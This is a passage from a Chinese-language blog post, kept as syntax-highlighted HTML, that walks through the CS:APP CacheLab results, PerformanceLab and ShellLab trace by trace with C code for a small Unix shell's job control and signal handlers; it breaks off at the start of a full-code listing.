class="attribute">Points</span> (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</span><br><span class="line">     <span class="attribute">3</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)       <span class="number">9</span>       <span class="number">8</span>       <span class="number">6</span>       <span class="number">9</span>       <span class="number">8</span>       <span class="number">6</span>  traces/yi<span class="number">2</span>.trace</span><br><span class="line">     <span class="attribute">3</span> (<span class="number">4</span>,<span class="number">2</span>,<span class="number">4</span>)       <span class="number">4</span>       <span class="number">5</span>       <span class="number">2</span>       <span class="number">4</span>       <span class="number">5</span>       <span class="number">2</span>  traces/yi.trace</span><br><span class="line">     <span class="attribute">3</span> (<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>)       <span class="number">2</span>       <span class="number">3</span>       <span class="number">1</span>       <span class="number">2</span>       <span class="number">3</span>       <span class="number">1</span>  traces/dave.trace</span><br><span class="line">     <span class="attribute">3</span> (<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>)     <span class="number">167</span>      <span class="number">71</span>      <span class="number">67</span>     <span class="number">167</span>      <span class="number">71</span>      <span class="number">67</span>  traces/trans.trace</span><br><span class="line">     <span class="attribute">3</span> (<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>)     <span class="number">201</span>      <span class="number">37</span>      <span class="number">29</span>     <span class="number">201</span>      <span class="number">37</span>      <span class="number">29</span>  traces/trans.trace</span><br><span class="line">     <span class="attribute">3</span> (<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>)     <span class="number">212</span>      <span class="number">26</span>      <span class="number">10</span>     <span class="number">212</span>      <span class="number">26</span>      <span class="number">10</span>  traces/trans.trace</span><br><span class="line">     <span class="attribute">3</span> (<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>)     <span class="number">231</span>       <span class="number">7</span>       <span class="number">0</span>     <span class="number">231</span>       <span class="number">7</span>       <span class="number">0</span>  traces/trans.trace</span><br><span class="line">     <span class="attribute">6</span> (<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>)  <span class="number">265189</span>   <span class="number">21775</span>   <span class="number">21743</span>  <span class="number">265189</span>   <span class="number">21775</span>   <span class="number">21743</span>  traces/long.trace</span><br><span class="line">    <span class="attribute">27</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">Part</span> B: Testing transpose function</span><br><span class="line"><span class="attribute">Running</span> ./test-trans -M <span class="number">32</span> -N <span class="number">32</span></span><br><span class="line"><span class="attribute">Running</span> ./test-trans -M <span class="number">64</span> -N <span class="number">64</span></span><br><span class="line"><span class="attribute">Running</span> ./test-trans -M <span class="number">61</span> -N <span class="number">67</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Cache</span> Lab summary:</span><br><span class="line">                        <span class="attribute">Points</span>   Max pts      Misses</span><br><span class="line"><span class="attribute">Csim</span> correctness          <span class="number">27</span>.<span class="number">0</span>        <span class="number">27</span></span><br><span class="line"><span class="attribute">Trans</span> perf <span class="number">32</span>x<span class="number">32</span>           <span class="number">8</span>.<span class="number">0</span>         <span class="number">8</span>         <span class="number">259</span></span><br><span class="line"><span class="attribute">Trans</span> perf <span class="number">64</span>x<span class="number">64</span>           <span class="number">8</span>.<span class="number">0</span>         <span class="number">8</span>        <span class="number">1179</span></span><br><span class="line"><span class="attribute">Trans</span> perf <span class="number">61</span>x<span class="number">67</span>          <span class="number">10</span>.<span class="number">0</span>        <span class="number">10</span>        <span class="number">1908</span></span><br><span class="line">          <span class="attribute">Total</span> points    <span class="number">53</span>.<span class="number">0</span>        <span class="number">53</span></span><br></pre></td></tr></table></figure>

<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>今天(<code>2021/8/28</code>)起床没多久就把<code>Part B</code>做完了，然后就一直在写题解，现在已经是下午四点半了。手腕写的很疼，小结部分不想写太多。回看整个<code>CacheLab</code>实验经历，犯了太多错误。有轻视实验难度，阅读材料不认真看错题干的，有凭感觉想当然做的，也有意志不坚定自己没思考多久就求助题解的。总的来说，除了之前说的过的，仍有遗憾——我感觉我的题解没写的特别清晰，主要配图也几乎没有，可能有点难理解。但值得欣慰的是没有匆匆就略过这个实验，知道自己是看了很多别人的题解才做出来的，就更要花时间把东西理解透彻，确保自己真的懂了。今天花了一天时间写题解，从最初的状态顺着思路完整梳理了一遍过程，对整个缓存的命中、缺失与替换有了更深的理解，确实学到了不少东西。戒骄戒躁，脚踏实地。</p>
<h1 id="PerformanceLab"><a href="#PerformanceLab" class="headerlink" title="PerformanceLab"></a>PerformanceLab</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Cache</span> Lab</span><br><span class="line"><span class="keyword">At</span> CMU we <span class="keyword">use</span> this lab <span class="keyword">in</span> place <span class="keyword">of</span> the <span class="keyword">Performance</span> Lab.</span><br></pre></td></tr></table></figure>

<p>由<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/labs.html">官网</a>描述，既然CMU都用<code>CacheLab</code>代替<code>PerformanceLab</code>，再加上自己时间有限，做过<code>CacheLab</code>就不做这个实验了</p>
<p>完结撒花！</p>
<h1 id="ShellLab"><a href="#ShellLab" class="headerlink" title="ShellLab"></a>ShellLab</h1><p>这个实验乍一看不难，实际上手也不很难，但要想完全解决仍不容易。其实坑还是不少，例如一上来就是残缺的程序，从哪个函数开始补全？是一个函数全补完了再弄别的函数还是齐头并进？从哪些功能的实现开始？做完回顾，觉得这个实验的确非常精妙，难度适中，初上手时看着要实现这么多功能，有这么多注意事项要考虑，脑子一下子转不过来。但无论某个功能实现起来有多难，用第八章学到的知识一定能实现，一点没有超纲。越做到后边越感受到实验作者的功力之深厚</p>
<p>首先，实验手册里那句<code>Read every word of Chapter 8(Exceptional Control Flow) in your textbook.</code>非常重要，所有的谜题都能在这一章找到答案。搭建<code>shell</code>时，同样按照实验手册里的建议，根据<code>tshref</code>例程运行从<code>trace0</code>到<code>trace16</code>的结果，一步一步来构建自己的<code>shell</code></p>
<h2 id="trace01"><a href="#trace01" class="headerlink" title="trace01"></a>trace01</h2><p>最开始实验时，我选择先从<code>eval()</code>函数开始入手，模仿书上示例里的<code>eval()</code>搭建自己的<code>eval()</code>。先将书上这个的函数代码原封不动复制过来，测试<code>trace01</code>文件，但由于本身这个测试没有任何输出，我不很确定这个测试着重点在哪，反正自己的程序也是没有任何返回，和例程运行结果一样就行</p>
<h2 id="trace02"><a href="#trace02" class="headerlink" title="trace02"></a>trace02</h2><p>坦白讲，<code>trace02</code>的作用我没太弄清，看似是实现<code>builtin()</code>函数，但结合<code>trace03</code>看，两个文件似乎让我做同一件事，不太明白</p>
<h2 id="trace03"><a href="#trace03" class="headerlink" title="trace03"></a>trace03</h2><p>按注释，此函数测试<code>shell</code>内置的<code>quit()</code>函数，因此应该修改<code>builtin()</code>函数实现对应功能，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我的<code>builtin_cmd()</code>函数逻辑为，只做判断，不实际运行（除<code>quit()</code>函数）</p>
<h2 id="trace04"><a href="#trace04" class="headerlink" title="trace04"></a>trace04</h2><p>由例程的运行结果分析知，需要实现后台作业，并将其信息显示在屏幕上，因此修改<code>eval()</code>函数实现如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">char</span>* argv[MAXARGS];            <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];              <span class="comment">/* Holds modified command line */</span></span><br><span class="line">    <span class="keyword">int</span> bg, state;                  <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;                      <span class="comment">/* Process id */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_one, mask_all, prev_one;</span><br><span class="line"></span><br><span class="line">    Sigemptyset(&amp;mask_one);</span><br><span class="line">    Sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)            <span class="comment">/* Ignore empty lines */</span></span><br><span class="line">        <span class="keyword">return</span>;     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;mask_one, &amp;prev_one);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((pid = Fork()) == <span class="number">0</span>) &#123;  <span class="comment">/* Child runs user job */</span></span><br><span class="line">            Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">            setpgid(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        state = bg ? BG : FG;</span><br><span class="line">           </span><br><span class="line">        <span class="comment">/* Block all signals.This process cannot be interrupted */</span></span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">        addjob(jobs, pid, state, cmdline);</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Parent waits for foreground job to terminate */</span></span><br><span class="line">        <span class="keyword">if</span> (bg) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> waitfg(pid);     </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;      <span class="comment">/* builtin command */</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>))</span><br><span class="line">            listjobs(jobs);</span><br><span class="line">        <span class="keyword">else</span> do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我将最终版完整的<code>eval()</code>函数直接放出来，因为如果每个<code>trace</code>文件都按最初实现的过程一步步重新模拟工作量太大，个人觉得这个实验难度也不很大，加上代码均配有注释，阅读理解起来难度不会很大，后面<code>trace</code>涉及改进此函数的都不再逐步演示，直接参考本代码即可。注意<code>eval()</code>几个难点，考虑竞争，<code>addjob()</code>函数的执行是绝不可打断的，所以执行前屏蔽所有信号。且<code>addjob()</code>须在处理子进程返回<code>SIGCHLD</code>信号前将子进程添加至<code>jobs</code>列表中，因此在判断输入的命令不是<code>shell</code>内置命令之后，立刻屏蔽<code>SIGCHLD</code>信号，但是子进程在调用<code>execve()</code>函数前又需要取消该信号的屏蔽。<code>setpgid()</code>功能请见实验手册</p>
<h2 id="trace05"><a href="#trace05" class="headerlink" title="trace05"></a>trace05</h2><p>这个测试的重点在于<code>jobs</code>命令的实现，该命令要实现的功能是打印所有后台程序。在本实验自带的辅助函数里有一个<code>listjobs()</code>函数，其功能为打印所有进程，无论前台后台，将其稍作修改，即可满足<code>jobs</code>指令功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (jobs[i].pid != <span class="number">0</span> &amp;&amp; jobs[i].state != FG) &#123;</span><br><span class="line">	        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);</span><br><span class="line">	        <span class="keyword">switch</span> (jobs[i].state) &#123;</span><br><span class="line">		    <span class="keyword">case</span> BG: </span><br><span class="line">		        <span class="built_in">printf</span>(<span class="string">&quot;Running &quot;</span>);</span><br><span class="line">		        <span class="keyword">break</span>;</span><br><span class="line">		    <span class="keyword">case</span> ST: </span><br><span class="line">		        <span class="built_in">printf</span>(<span class="string">&quot;Stopped &quot;</span>);</span><br><span class="line">		        <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">default</span>:</span><br><span class="line">		        <span class="built_in">printf</span>(<span class="string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>, </span><br><span class="line">			       i, jobs[i].state);</span><br><span class="line">	        &#125;</span><br><span class="line">	        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, jobs[i].cmdline);</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="trace06"><a href="#trace06" class="headerlink" title="trace06"></a>trace06</h2><p>要求实现捕捉<code>SIGINT</code>信号，终止前台程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>)</span><br><span class="line">        kill(-pid, SIGINT);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No foreground job is running!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意<code>kill()</code>函数应向前台进程所在的整个进程组发送信号，因此是负的<code>pid</code>值</p>
<h2 id="trace07"><a href="#trace07" class="headerlink" title="trace07"></a>trace07</h2><p>由<code>eval()</code>函数里<code>setpgid(0, 0)</code>已实现</p>
<h2 id="trace08"><a href="#trace08" class="headerlink" title="trace08"></a>trace08</h2><p>要求实现捕捉<code>SIGTSTP</code>信号，停止前台程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>)</span><br><span class="line">        kill(-pid, SIGTSTP);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No foreground job is running!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="trace09-amp-trace10"><a href="#trace09-amp-trace10" class="headerlink" title="trace09 &amp; trace10"></a>trace09 &amp; trace10</h2><p>都是关于<code>do_bgfg()</code>函数的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> jid = <span class="number">0</span>, pid = <span class="number">0</span>, isFG = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>* cp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span>* <span class="title">job</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    isFG = (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>) &#123;  <span class="comment">/* Parameter missing */</span></span><br><span class="line">        <span class="keyword">if</span> (isFG)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;fg command requires PID or %%jobid argument\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;bg command requires PID or %%jobid argument\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cp = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (cp[<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>) &#123; <span class="comment">/* The number stands for jid */</span></span><br><span class="line">        cp++;</span><br><span class="line">        <span class="comment">/* Check whether the ID is valid */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span>* tmp = cp; *tmp != <span class="string">&#x27;\0&#x27;</span>; tmp++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*tmp &lt; <span class="string">&#x27;0&#x27;</span> || *tmp &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isFG)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;fg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;bg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        jid = atoi(cp);</span><br><span class="line">        job = getjobjid(jobs, jid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;              <span class="comment">/* The number stands for pid */</span></span><br><span class="line">        <span class="comment">/* Check whether the ID is valid */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span>* tmp = cp; *tmp != <span class="string">&#x27;\0&#x27;</span>; tmp++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*tmp &lt; <span class="string">&#x27;0&#x27;</span> || *tmp &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isFG)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;fg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;bg: argument must be a PID or %%jobid\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pid = atoi(cp);</span><br><span class="line">        job = getjobpid(jobs, pid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, jid);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, pid);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Since we want to put the process in the </span></span><br><span class="line"><span class="comment">    foreground or background, restart it if it was stopped */</span></span><br><span class="line">    kill(-job-&gt;pid, SIGCONT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isFG) &#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="trace11-amp-trace-12"><a href="#trace11-amp-trace-12" class="headerlink" title="trace11 &amp; trace 12"></a>trace11 &amp; trace 12</h2><p>发送信号给整个进程组成员，在<code>trace06, trace08</code>已实现</p>
<h2 id="trace13-amp-trace-14-amp-trace15-amp-trace16"><a href="#trace13-amp-trace-14-amp-trace15-amp-trace16" class="headerlink" title="trace13 &amp; trace 14 &amp; trace15 &amp; trace16"></a>trace13 &amp; trace 14 &amp; trace15 &amp; trace16</h2><p>没啥新东西</p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span 